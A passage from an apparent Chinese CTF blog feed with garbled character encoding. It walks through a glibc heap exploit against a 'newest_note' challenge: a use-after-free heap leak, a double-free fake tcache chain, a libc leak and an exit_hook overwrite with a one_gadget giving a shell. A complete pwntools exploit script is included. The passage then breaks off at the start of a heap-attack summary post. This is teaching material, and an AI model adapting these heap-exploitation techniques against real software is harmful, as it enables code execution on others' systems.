title="æ€è·¯æ•´ç†"></a>æ€è·¯æ•´ç†</h2><p>æˆ‘ä»¬æ¥çœ‹çœ‹å¯ä»¥æ‹¿åˆ°çš„ä¿¡æ¯æœ‰å“ªäº›ã€‚é¦–å…ˆï¼Œç”±äºæ–°libcçš„æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨uafæ¼æ´è½»æ¾è·å–heapbaseï¼Œè¿™é‡Œçš„keyæ˜¯æ–°libcç¯å¢ƒä¸‹ç”¨æ¥xoræ“ä½œçš„å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1e140e2c358548f7b56cec373b77f0d8.png" alt="img"></p><p>å…¶æ¬¡ï¼Œè€ƒè™‘å¦‚ä½•æ³„éœ²libcï¼Œç”±äºå­˜åœ¨UAFï¼Œæˆ‘ä»¬ä¸€èˆ¬å¯ä»¥é€šè¿‡unsortbinæ¥è¿›è¡Œæ³„éœ²ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œæ¯ä¸ªchunkçš„sizeéƒ½ä¸å¤Ÿå¤§ï¼Œå³ä¾¿å¡«æ»¡tacheä¹Ÿåªä¼šè¿›å…¥fastbinï¼Œè€Œä¸æ˜¯unsortbinã€‚åœ¨è¿™é‡Œï¼Œæˆ‘æƒ³åˆ°äº†ä¸¤ä¸ªæ€è·¯</p><ul><li><p>å…¶ä¸€ï¼Œåœ¨ç¨‹åºå¼€å¤´æˆ‘ä»¬è¾“å…¥äº†ä¸€ä¸ªsizeï¼Œå¹¶mallocäº†ä¸€ä¸ª8*sizeçš„chunkç”¨æ¥èµ·åˆ°noteè®°å½•çš„ä½œç”¨ã€‚å³è¿™ä¸ªchunkçš„sizeæ˜¯å¯æ§çš„ï¼Œ<strong>æ›´é‡è¦çš„æ˜¯è¿™ä¸ªchunkæ²¡æœ‰é™åˆ¶å¤§å°</strong>å¦‚æœå¯ä»¥freeè¿™ä¸ªchunkè¿›å…¥unsortbinï¼Œä¾¿å¯ä»¥å®ç°libcçš„æ³„éœ²ã€‚ä½†æ˜¯åœ¨è¿™ç§æ€è·¯ä¸‹ï¼Œè€ƒè™‘å¡«æ»¡tcacheéœ€è¦7æ¬¡freeï¼Œdoublefreeæ§åˆ¶æŒ‡é’ˆæŒ‡å‘notechunkéœ€è¦2-3æ¬¡freeï¼Œæ³„éœ²libcéœ€è¦ä¸€æ¬¡freeï¼Œç„¶åå†æ¬¡doublefreeåŠ«æŒhookã€‚freeçš„æ¬¡æ•°æ˜¾ç„¶è¶…è¿‡11æ¬¡ï¼Œæš‚æ—¶æ— æ³•å®ç°ï¼Œå¦‚æœæœ‰å¤§ä½¬æœ‰æ–¹æ³•é€šè¿‡æ§åˆ¶å¼€å¤´çš„notechunkæ¥è§£å‡ºè¿™é“é¢˜ï¼Œå¸Œæœ›èƒ½æŒ‡ç‚¹ä¸‹æˆ‘ğŸ˜­</p></li><li><p>å…¶äºŒï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªé€ ä¸€ä¸ªtcacheé“¾ï¼Œä½¿å¾—å…¶å®é™…sizeå°äº0x40ï¼Œåˆ©ç”¨æº¢å‡ºæ„é€ ä¼ªé€ å·¨å¤§chunkå¤´å¹¶freeè¿›å…¥unsortbinï¼Œå¾—åˆ°libcã€‚åŒæ—¶åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æº¢å‡ºè½»æ˜“å®Œæˆå¯¹freechunkå†…å®¹çš„æ›´æ”¹ï¼Œä»¥æ­¤åŠ«æŒhook</p></li></ul><p>ä¸‹é¢æˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§æ€è·¯</p><h3 id="ä¸€ã€å¾—åˆ°heapbase"><a href="#ä¸€ã€å¾—åˆ°heapbase" class="headerlink" title="ä¸€ã€å¾—åˆ°heapbase"></a>ä¸€ã€å¾—åˆ°heapbase</h3><p>å¼€å§‹å…ˆç”³è¯·å‡ ä¸ªchunkï¼Œå¤šç”³è¯·çš„é‚£å‡ ä¸ªæ˜¯ç”¨æ¥æ‰©å……å¯æ§å †åŒºåŸŸçš„å¤§å°ï¼Œä¸ºä¼ªé€ çš„å¤§chunkæä¾›ç©ºé—´ï¼Œä¸ç„¶è¦†ç›–è¿›topchunkç¨‹åºä¼šå´©æ‰ã€‚è¿™ä¸ªæ­¥éª¤æ¯”è¾ƒç®€å•ï¼Œå‰é¢ä¹Ÿè°ˆåˆ°äº†ä¸è¿‡å¤šèµ˜è¿°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><h3 id="äºŒã€ä¼ªé€ fastbiné“¾"><a href="#äºŒã€ä¼ªé€ fastbiné“¾" class="headerlink" title="äºŒã€ä¼ªé€ fastbiné“¾"></a>äºŒã€ä¼ªé€ fastbiné“¾</h3><p>è¿™é‡Œæˆ‘ä»¬å…ˆå¡«æ»¡tcache,ç„¶åfree 7å·chunkè¿›å…¥fastbinï¼Œç»“æ„å…¥ä¸‹å›¾æ‰€ç¤ºã€‚ç”±äºæ–°çš„libcæœºåˆ¶ï¼Œè¿™é‡Œçš„fdæŒ‡é’ˆéƒ½è¿›è¡Œäº†å¼‚æˆ–æ“ä½œï¼Œæ‰€ä»¥çœ‹èµ·æ¥å¹¶ä¸æ˜¯å¾ˆç›´è§‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e5ae010babec4989a45fa29018da4cb4.png" alt="img"></p><p>ç„¶åç”³è¯·chunkï¼Œæ­¤æ—¶ä»tcacheä¸­å–å‡ºæœ€åä¸€ä¸ªchunkã€‚ç”±äºæ­¤æ—¶tcacheä¸­ä»…å‰©6ä¸ªchunkï¼Œæˆ‘ä»¬å†å¯¹7å·chunkè¿›è¡Œfreeæ—¶ï¼Œå®ƒä¾¿ä¼šæ”¾å…¥tcacheä¸­ã€‚é€šè¿‡è¿™æ ·çš„doublefreeæˆ‘ä»¬æ„é€ äº†ä¸€ä¸ªå³åœ¨Tcacheåˆåœ¨fastbinçš„chunkï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="https://img-blog.csdnimg.cn/839aa64c464c4ab1a42b524daf40f730.png" alt="img"></p><p> æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥å¼€å§‹æ„é€ fake fastbinï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¸­çš„fdæŒ‡é’ˆåŒæ ·éœ€è¦å¼‚æˆ–å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æ„,æ­¤æ—¶tcacheé“¾é•¿åº¦ä¸º0ï¼Œfastbinçš„é•¿åº¦ä¸º7.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5e6f8e3dac8945b28ddf8b4794c3395f.png" alt="img"></p><h3 id="ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc"><a href="#ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc" class="headerlink" title="ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc"></a>ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc</h3><p> æ­¤æ—¶æˆ‘ä»¬è°ƒç”¨add()ï¼Œå°±ä¼šè§¦å‘fastbinå’Œtcacheçš„stashæœºåˆ¶ï¼Œæ­¤æ—¶å…¶ä½™6ä¸ªchunkä¾¿ä¼šæ‰”åˆ°tcacheä¸­ï¼Œå…¶ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p><blockquote><p> å½“ä» fastbin é‡Œå– chunk æ—¶ï¼Œå…¶ä½™çš„ chunk ä¼šè¢«ä¾æ¬¡æ”¾å…¥å¯¹åº”çš„ tcache ä¸­ï¼Œç»ˆæ­¢æ¡ä»¶æ—¶ fastbin é“¾ä¸ºç©ºæˆ–è€… tcache è£…æ»¡ã€‚</p></blockquote><p><img src="https://img-blog.csdnimg.cn/687aa9ca42f04f08895b1958d2ae0c29.png" alt="img"></p><p> å†æ¬¡addï¼Œtcacheå’Œfastbinçš„å–å‡ºé¡ºåºæ˜¯ç›¸åçš„ï¼Œå³tcacheæœ€ä¸Šæ–¹çš„chunkå°†è¢«å–å‡ºï¼ŒåŒæ—¶ç¼–è¾‘å†…å®¹æ›´æ”¹<strong>0x56309de85360</strong>çš„å¤´éƒ¨sizeå¤§å°ä¸º0x441ã€‚ä¹‹åæˆ‘ä»¬åªéœ€è¦freeæ‰360å¤„çš„chunkä¾¿å¯æ³„éœ²libc</p><blockquote><p> fastbinæœ€å¤§ä¸º0x410,è¿™é‡Œç”¨0x441åˆšå¥½å¯ä»¥å¯¹é½chunk</p></blockquote><p><img src="https://img-blog.csdnimg.cn/60c6e7ed5e2d4633b5226a7183ab38d7.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br></code></pre></td></tr></table></figure><blockquote><p> è¿™é‡Œæ²¡æœ‰é€‰æ‹©freehookæˆ–è€…mallochookæ˜¯å› ä¸ºæ²¡æœ‰åˆé€‚çš„onegadgetï¼Œé€‰æ‹©åŠ«æŒexithook</p></blockquote><h3 id="å››ã€åŠ«æŒexithook"><a href="#å››ã€åŠ«æŒexithook" class="headerlink" title="å››ã€åŠ«æŒexithook"></a>å››ã€åŠ«æŒexithook</h3><p>ç”±äºæˆ‘ä»¬åœ¨tcacheé“¾é‡ŒæŠ˜å äº†ä¸¤ä¸ªchunkè¿™æ ·ä¾¿å¯ä»¥è½»æ¾çš„æ›´æ”¹freechunkçš„å†…å®¹ï¼ŒåŠ«æŒexithookä¸ºongadgetç„¶åç»“æŸç¨‹åºä¾¿å¯ï¼Œæœ€ç»ˆç»“æ„å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6d12cf8cb53c453683ef5ee3ddc6f2d2.png" alt="img"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    io.send(text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>pause()<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">## fake tcache</span><br>add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br><br>io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>io.interactive()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HEAP æ”»å‡»æ–¹å¼è®°å½•ä»¥åŠæ€»ç»“</title>
    <link href="/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <url>/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ–‡ç« å¾ˆå¤šå›¾æºæ¥è‡ªNTUSTISCä¾‹ä¼šè§†é¢‘ï¼Œæ²¹ç®¡é“¾æ¥ï¼š<a href="https://www.youtube.com/watch?v=ItpJY9Lpw-o&list=PLHP-B3mcSY_5r5AJsZyTZLwjX9z8v_b5x">NTUSTISC - Pwn 3 - YouTube</a><br>ç›®å‰åªæ”¯æŒåˆ°libc2.34ç‰ˆæœ¬</p></blockquote><h2 id="Heap-Based-Buffer-Overflow"><a href="#Heap-Based-Buffer-Overflow" class="headerlink" title="Heap-Based Buffer Overflow"></a>Heap-Based Buffer Overflow</h2><p>æœ€æœ€åŸºæœ¬çš„æ”»å‡»æ–¹å¼ï¼Œç”±äºæœªå¯¹è¾“å…¥é•¿åº¦é™åˆ¶ï¼Œä¸”å †å—æ˜¯ä¸€ç‰‡è¿ç»­å­˜å‚¨çš„å†…å­˜ç©ºé—´ç‰¹æ€§ã€‚å¯¼è‡´å¯ä»¥å¯¹å…¶åé«˜åœ°å€çš„chunkçš„å„ç§ä¿¡æ¯è¿›è¡Œè¦†å†™ã€‚</p><p><img src="/img/article/1.png"></p><p><img src="/img/article/2.png"></p><h2 id="UAF-Use-after-free"><a href="#UAF-Use-after-free" class="headerlink" title="UAF(Use-after-free)"></a>UAF(Use-after-free)</h2><p>åœ¨free()æ‰chunkä¹‹åï¼ŒåŸæœ¬æŒ‡å‘chunkçš„æŒ‡é’ˆç”±äºç¨‹åºçŒ¿è‡ªèº«çš„æ‡’æƒ°ï¼Œæ²¡æœ‰å°†pointer &#x3D; NULL; å¯¼è‡´ä¾ç„¶å¯ä»¥ä½¿ç”¨è¯¥æŒ‡é’ˆè¿›è¡Œé¢å¤–çš„æ“ä½œ</p><p>UAFæ¼æ´ä¸€èˆ¬å¸¸ç”¨äºæ³„éœ²ï¼Œæˆ–è€…æ›´æ”¹å·²ç»freeæ‰çš„chunkä¸­çš„ä¿¡æ¯ï¼Œæœ€å¸¸è§ä¾¿æ˜¯libcçš„æ³„éœ²,ä»¥åŠå¯¹Tcache&#x2F;Fastbiné“¾è¡¨çš„æ§åˆ¶</p><blockquote><p>å½“ç¬¬ä¸€å—chunkè¿›å…¥unsorted 